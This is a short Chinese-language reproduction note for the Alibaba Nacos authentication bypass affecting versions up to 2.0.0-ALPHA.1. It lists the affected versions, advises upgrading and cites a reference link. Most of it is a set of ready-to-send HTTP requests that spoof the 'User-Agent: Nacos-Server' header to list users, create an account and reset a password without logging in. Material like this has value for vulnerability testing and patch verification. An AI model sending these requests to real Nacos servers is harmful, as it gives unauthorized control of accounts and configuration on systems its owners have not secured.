### Alibaba Nacos权限认证绕过漏洞复现
```
## 影响版本: Nacos <= 2.0.0-ALPHA.1
## 修复建议: 官方已发布安全版本，建议下载或升级至最新版本
## 相关链接: https://www.freebuf.com/vuls/263845.html
```

```rest
@nacos=http://127.0.0.1:8849/nacos

### 查询用户
GET {{nacos}}/v1/auth/users?pageNo=1&pageSize=10
User-Agent: Nacos-Server


### 创建用户

POST {{nacos}}/v1/auth/users
User-Agent: Nacos-Server
Content-Type: application/x-www-form-urlencoded

username=demo&password=demo

### 密码重置

PUT {{nacos}}/v1/auth/users
User-Agent: Nacos-Server
Content-Type: application/x-www-form-urlencoded

username=demo&newPassword=demodemo
```